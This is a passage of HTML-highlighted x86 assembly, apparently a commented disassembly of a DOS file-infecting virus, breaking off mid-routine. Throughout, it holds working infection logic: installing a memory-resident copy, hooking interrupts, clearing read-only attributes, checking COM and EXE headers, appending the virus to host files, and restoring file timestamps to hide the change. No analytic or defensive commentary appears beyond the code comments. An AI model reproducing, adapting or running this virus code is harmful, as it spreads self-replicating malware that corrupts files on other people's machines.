    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">SEGREG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save segment</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0FFH</span><span class="sc0">    </span><span class="sc1">; Should virus be installed?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0300</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0010H</span><span class="sc0">        </span><span class="sc1">; Add PSP length to segment</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Store segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; ?</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; ?</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Branch to ?</span><span class="sc0">

    </span><span class="sc1">; Install resident copy of virus</span><span class="sc0">

</span><span class="sc5">BP0300</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0510</span><span class="sc0">          </span><span class="sc1">; Get installed virus segment</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; \ Replace first word of host</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DW0000</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; \ Replace third byte of host</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DB0002</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0310</span><span class="sc0">          </span><span class="sc1">; Branch if installed</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">           </span><span class="sc1">; Get current segment</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">01D0H</span><span class="sc0">        </span><span class="sc1">; Add length of installed segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Segment to copy to</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Start of virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Copy relocation factor</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP1160</span><span class="sc0">          </span><span class="sc1">; Copy virus and transfer control</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Relocation factor (as length)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Relocation factor as source</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; Back one byte</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Same offset as target</span><span class="sc0">
    </span><span class="sc6">STD</span><span class="sc0">             </span><span class="sc1">; Going backwards</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">; Copy host program</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0100H</span><span class="sc0">        </span><span class="sc1">; Target following PSP</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Current segment as source</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Start of virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP1160</span><span class="sc0">          </span><span class="sc1">; Copy virus and transfer control</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0100H</span><span class="sc0">        </span><span class="sc1">; New relocation factor</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0580</span><span class="sc0">          </span><span class="sc1">; Install interrupts</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">01D0H</span><span class="sc0">        </span><span class="sc1">; Get length of installed segment</span><span class="sc0">
</span><span class="sc5">BP0310</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; \ New segment for host</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">0100H</span><span class="sc0">   </span><span class="sc1">; Host offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc8">DI</span><span class="sc0">       </span><span class="sc1">; Host segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; ?</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; ?</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; \
    MOV ES,DI           ;  ) Set up other segment registers</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Branch to host program</span><span class="sc0">

    </span><span class="sc1">; Clear error flag and return</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">BP0320</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">CRTERR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Clear critical error flag</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Write infection count</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
</span><span class="sc5">BP0330</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">F_HAND</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get file handle</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Test for a handle</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0340</span><span class="sc0">          </span><span class="sc1">; Branch if none</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address infection count</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DB0004</span><span class="sc0">    </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Length to write</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP0340</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Process file</span><span class="sc0">

</span><span class="sc5">BP0350</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">19H</span><span class="sc0">          </span><span class="sc1">; Get current disk function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">          </span><span class="sc1">; Convert to letter</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">          </span><span class="sc1">; Disk separator</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">DB0884</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Disk in pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">DB0884</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc13">'\' ; Root directory in pathname
</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">DB0884</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">; Address next position in pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">47H</span><span class="sc0">          </span><span class="sc1">; Get current directory function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Buffer area</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">           </span><span class="sc1">; Default drive</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">; Back one character</span><span class="sc0">
</span><span class="sc5">BP0360</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">; Next character</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get character</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Is it zero</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0360</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc13">'\'   ; Store directory separator
</span><span class="sc0">    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">; Next position</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Copy filename pointer</span><span class="sc0">
</span><span class="sc5">BP0370</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get character</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">         </span><span class="sc1">; Store in pathname</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; Next input position</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">; Next output position</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; End of filename?</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0370</span><span class="sc0">          </span><span class="sc1">; Next character if not</span><span class="sc0">
</span><span class="sc5">BP0380</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4300H</span><span class="sc0">        </span><span class="sc1">; Get attributes function</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0320</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ATTR_F</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save attributes</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">00FEH</span><span class="sc0">        </span><span class="sc1">; Set off read only</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">        </span><span class="sc1">; Set attributes function</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0320</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">        </span><span class="sc1">; Open handle R/W function</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0230</span><span class="sc0">          </span><span class="sc1">; Perform a DOS service</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0320</span><span class="sc0">          </span><span class="sc1">; Branch if error</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Move handle</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0400</span><span class="sc0">          </span><span class="sc1">; Infect file if not infected</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSHF</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">ATTR_F</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get attributes</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">          </span><span class="sc1">; Archive only?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0390</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">        </span><span class="sc1">; Set attributes function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
</span><span class="sc5">BP0390</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">TIME_F</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get file time</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">DATE_F</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get file date</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701H</span><span class="sc0">        </span><span class="sc1">; Set file date and time function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">          </span><span class="sc1">; Close handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">POPF</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Infect file if not infected</span><span class="sc0">

</span><span class="sc5">BP0400</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5700H</span><span class="sc0">        </span><span class="sc1">; Get file date and time function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">TIME_F</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save file time</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DATE_F</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Save file date</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address buffer</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0DH</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Copy this address</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001CH</span><span class="sc0">        </span><span class="sc1">; EXE header length</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">  </span><span class="sc1">; EXE header?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0430</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0500</span><span class="sc0">          </span><span class="sc1">; Move pointer to end of file</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SIGNAT</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">   </span><span class="sc1">; Add length of virus</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0410</span><span class="sc0">          </span><span class="sc1">; Branch if too big for a COM</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc2">0E9H</span><span class="sc0">  </span><span class="sc1">; Does it start with a near jump?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0420</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get displacement from jump</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Clear top </span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer (start) function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Read buffer</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">001CH</span><span class="sc0">        </span><span class="sc1">; Add length of EXE header</span><span class="sc0">
